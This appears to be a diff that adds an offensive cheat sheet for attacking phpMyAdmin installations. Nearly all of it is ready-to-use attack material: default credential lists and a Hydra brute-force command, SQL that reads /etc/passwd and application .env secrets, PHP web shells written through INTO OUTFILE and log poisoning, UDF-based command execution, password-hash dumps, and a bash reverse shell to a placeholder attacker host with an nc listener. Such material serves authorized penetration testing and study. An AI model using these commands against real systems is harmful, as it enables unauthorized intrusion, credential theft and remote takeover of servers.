@@ -1,0 +1,198 @@
+---
+title: "PHPMyAdmin"
+---
+
+## Service Detection
+
+Common paths:
+
+```http
+/phpmyadmin
+/phpMyAdmin
+/pma
+/dbadmin
+/mysql
+/admin
+/sql
+```
+
+---
+
+## Default Credentials
+
+```shellscript
+root:<blank>
+root:root
+root:toor
+admin:admin
+mysql:mysql
+pma:pma
+```
+
+Hydra:
+
+```bash
+hydra -L users.txt -P passwords.txt TARGET http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:Cannot log in"
+```
+
+---
+
+## Version Enumeration
+
+Bottom of login page usually leaks version:
+
+```shellscript
+phpMyAdmin 4.8.1
+```
+
+Search exploits:
+
+```bash
+searchsploit phpmyadmin 4.8
+```
+
+---
+
+## Read Files (LFI via MySQL)
+
+Works if MySQL has FILE privilege.
+
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('C:/Windows/win.ini');
+SELECT LOAD_FILE('/var/www/html/config.php');
+```
+
+Dump credentials:
+
+```sql
+SELECT LOAD_FILE('/var/www/html/.env');
+```
+
+---
+
+## Write Web Shell (Linux)
+
+Check web root:
+
+```sql
+SHOW VARIABLES LIKE "secure_file_priv";
+```
+
+If empty → writable anywhere
+
+```sql
+SELECT "<?php system($_GET['cmd']); ?>"
+INTO OUTFILE '/var/www/html/shell.php';
+```
+
+Access:
+
+```
+http://TARGET/shell.php?cmd=id
+```
+
+---
+
+## Write Web Shell (Windows)
+
+```sql
+SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"f\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\"></FORM><pre><?php system($_GET['cmd']); ?></pre></BODY></HTML>"
+INTO OUTFILE 'C:\\xampp\\htdocs\\cmd.php';
+```
+
+---
+
+## Bypass secure_file_priv
+
+Find writable directories:
+
+```sql
+SHOW VARIABLES LIKE 'datadir';
+```
+
+Write inside MySQL folder:
+
+```sql
+SELECT "<?php system($_GET['cmd']); ?>"
+INTO OUTFILE '/var/lib/mysql/shell.php';
+```
+
+Then include via LFI from web app.
+
+---
+
+## Upload Web Shell via Logs Poisoning
+
+Write PHP into logs:
+
+```sql
+SET GLOBAL general_log = 'ON';
+SET GLOBAL general_log_file = '/var/www/html/log.php';
+SELECT "<?php system($_GET['cmd']); ?>";
+```
+
+---
+
+## Command Execution via UDF (MySQL RCE)
+
+Check privileges:
+
+```sql
+SELECT user, file_priv, super_priv FROM mysql.user;
+```
+
+If FILE + SUPER → full RCE
+
+Upload malicious UDF:
+
+```bash
+searchsploit mysql udf
+```
+
+Then:
+
+```sql
+CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
+SELECT sys_exec('id');
+```
+
+---
+
+## Dump Password Hashes
+
+```sql
+SELECT user,host,authentication_string FROM mysql.user;
+```
+
+Old MySQL:
+
+```sql
+SELECT user,password FROM mysql.user;
+```
+
+---
+
+## Extract Application Credentials
+
+```sql
+SHOW DATABASES;
+USE wordpress;
+SHOW TABLES;
+SELECT * FROM wp_users;
+```
+
+---
+
+## Reverse Shell
+
+```sql
+SELECT "<?php system('bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"'); ?>"
+INTO OUTFILE '/var/www/html/rev.php';
+```
+
+Listener:
+
+```bash
+nc -lvnp 4444
+```
